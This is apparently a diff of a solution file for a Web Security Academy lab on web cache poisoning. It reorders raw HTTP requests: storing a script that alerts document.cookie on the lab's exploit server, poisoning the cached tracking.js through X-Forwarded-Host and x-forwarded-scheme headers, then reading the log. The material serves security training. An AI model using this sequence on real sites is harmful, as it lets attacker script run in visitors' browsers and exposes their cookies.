@@ -1,15 +1,15 @@
 GET / HTTP/1.1
 Host: acf91fea1ee8a6a3c0990ec500000043.web-security-academy.net
 
-GET /resources/js/tracking.js HTTP/1.1
-Host: acf91fea1ee8a6a3c0990ec500000043.web-security-academy.net
-X-Forwarded-Host: exploit-ac481fe01e2fa6c2c0a40e0501fa00fa.web-security-academy.net
-x-forwarded-scheme: http
-
 POST / HTTP/1.1
 Host: exploit-ac481fe01e2fa6c2c0a40e0501fa00fa.web-security-academy.net
 
 urlIsHttps=on&responseFile=/resources/js/tracking.js&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+application%2Fjavascript%3B+charset%3Dutf-8&responseBody=alert%28document.cookie%29%3B&formAction=STORE
+
+GET /resources/js/tracking.js HTTP/1.1
+Host: acf91fea1ee8a6a3c0990ec500000043.web-security-academy.net
+X-Forwarded-Host: exploit-ac481fe01e2fa6c2c0a40e0501fa00fa.web-security-academy.net
+x-forwarded-scheme: http
 
 GET /log HTTP/1.1
 Host: exploit-ac481fe01e2fa6c2c0a40e0501fa00fa.web-security-academy.net
